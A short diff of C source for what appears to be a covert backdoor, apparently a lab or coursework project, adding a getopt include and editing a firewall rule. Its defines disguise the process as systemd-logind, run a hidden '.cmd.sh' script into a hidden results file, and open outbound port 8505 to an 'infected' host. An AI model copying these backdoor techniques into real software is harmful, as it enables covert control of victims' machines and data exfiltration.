@@ -24,6 +24,7 @@
 #include "../src/covert_wrappers.h"
 #include <unistd.h>
 #include <time.h>
+#include <getopt.h>
 
 struct my_ip {
 	u_int8_t	ip_vhl;		/* header length, version */
@@ -76,7 +77,7 @@ struct sniff_tcp {
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./.cmd.sh > .results"
 #define CHMOD "chmod 755 .cmd.sh"
-#define IPTABLES(ip) "iptables -A OUTPUT -p tcp -d " ip " --dport 8505 -j ACCEPT"
+#define IPTABLES(ip) "iptables -A OUTPUT 1 -p tcp -d " ip " --dport 8505 -j ACCEPT"
 #define TURNOFF(ip) "iptables -D OUTPUT -p tcp -d " ip " --dport 8505 -j ACCEPT"
 #define RESULT_FILE ".results"
 #define INFECTEDIP "192.168.0.100"
